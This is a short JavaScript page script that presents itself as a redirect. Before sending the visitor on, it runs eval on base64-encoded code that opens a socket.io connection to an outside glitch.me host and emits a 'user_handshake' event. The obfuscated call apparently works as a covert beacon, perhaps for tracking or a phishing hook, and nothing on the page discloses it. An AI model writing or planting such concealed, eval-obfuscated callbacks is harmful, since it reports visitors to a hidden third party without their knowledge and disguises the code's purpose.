var hooklink = "https://www.example.com";
// var params = new URLSearchParams(window.location.href);

function wait(d) {
  return new Promise((res) => setTimeout(res, d * 1000));
}

wait(0 * Math.random()).then(function () {
  wait(0.2 * Math.random())
    .then(function () {
      console.log("Redirecting...");
    })
    .then(function () {
      var _s = eval(
        atob(
          "aW8uY29ubmVjdCgnaHR0cHM6Ly9uYXR1cmFsLWR1bmUtZm9zc2EuZ2xpdGNoLm1lJyk="
        )
      );

      function sendReq() {
        return new Promise(function (res) {
          _s[atob("ZW1pdA==")](atob("dXNlcl9oYW5kc2hha2U="), function () {
            res();
          });
        });
      }

      sendReq().then(function () {
        window.location.assign(hooklink);
      });
    });
});
